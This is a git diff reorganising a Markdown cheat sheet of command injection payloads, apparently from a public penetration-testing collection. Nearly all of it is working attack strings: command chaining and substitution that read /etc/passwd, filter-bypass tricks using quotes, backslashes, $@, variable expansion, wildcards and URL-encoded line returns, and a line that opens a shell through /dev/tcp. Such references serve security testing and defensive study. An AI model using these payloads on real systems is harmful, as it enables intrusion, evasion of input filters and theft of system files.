@@ -1,11 +1,40 @@
 # Command Injection
 
-Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
 
+## Summary
+
+* [Tools](#tools)
+* [Exploits](#exploits)
+  * [Basic commands](#basic-commands)
+  * [Chaining commands](#chaining-commands)
+  * [Inside a command](#inside-a-command)
+* [Filter Bypasses](#filter-bypasses)
+  * [Bypass without space](#bypass-without-space)
+  * [Bypass with a line return](#bypass-with-a-line-return)
+  * [Bypass blacklisted words](#bypass-blacklisted-words)
+   * [Bypass with single quote](#bypass-with-a-single-quote)
+   * [Bypass with double quote](#bypass-with-a-double-quote)
+   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
+   * [Bypass with $@](#bypass-with-----)
+   * [Bypass with variable expansion](#bypass-with-variable-expansion)
+   * [Bypass with wildcards](#bypass-with-wildcards)
+* [Challenge](#challenge)
+* [Time based data exfiltration](#time-based-data-exfiltration)
+* [DNS based data exfiltration](#dns-based-data-exfiltration)
+* [Polyglot command injection](#polyglot-command-injection)
+* [References](#references)
+    
+
+## Tools
+
+* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)
 
 ## Exploits
 
-Normal command, execute the command and voila :p
+### Basic commands
+
+Execute the command and voila :p
 
 ```powershell
 cat /etc/passwd
@@ -15,23 +44,27 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 ```
 
-Commands execution by chaining commands
+### Chaining commands
 
-```bash
+```powershell
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
 original_cmd_by_server || ls    Only if the first cmd fail
 ```
 
-Commands execution inside a command
+### Inside a command
 
 ```bash
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```
 
-Commands execution without space - Linux
+## Filter Bypasses
+
+### Bypass without space
+
+Works on Linux only.
 
 ```powershell
 swissky@crashlab:~/Www$ cat</etc/passwd
@@ -56,51 +89,57 @@ Linux crashlab 4.4.X-XX-generic #72-Ubuntu
 swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
-Commands execution without space - Windows
-
-```powershell
-ping%CommonProgramFiles:~10,-18%IP
-ping%PROGRAMFILES:~10,-5%IP
-```
-
 Commands execution without spaces, $ or { } - Linux (Bash only)
 
 ```powershell
 IFS=,;`cat<<<uname,-a`
 ```
 
-Commands execution with a line return
+Works on Windows only.
+
+```powershell
+ping%CommonProgramFiles:~10,-18%IP
+ping%PROGRAMFILES:~10,-5%IP
+```
+
+### Bypass with a line return
 
 ```powershell
 something%0Acat%20/etc/passwd
 ```
 
-Bypass blacklisted word with single quote
+### Bypass Blacklisted words
+
+#### Bypass with single quote
 
 ```powershell
 w'h'o'am'i
 ```
 
-Bypass blacklisted word with double quote
+#### Bypass with double quote
 
 ```powershell
 w"h"o"am"i
 ```
 
-Bypass blacklisted word with backslash and slash
+#### Bypass with backslash and slash
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-Bypass blacklisted word with $@
+#### Bypass with $@
 
 ```powershell
 who$@ami
+
+echo $0
+-> /usr/bin/zsh
+echo whoami|$0
 ```
 
-Bypass blacklisted word with variable expansion
+#### Bypass with variable expansion
 
 ```powershell
 /???/??t /???/p??s??
@@ -110,18 +149,11 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-Bypass blacklisted word with wildcards
+#### Bypass with wildcards
+
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
-```
-
-Bypass zsh/bash/sh blacklist
-
-```powershell
-echo $0
--> /usr/bin/zsh
-echo whoami|$0
 ```
 
 ## Challenge
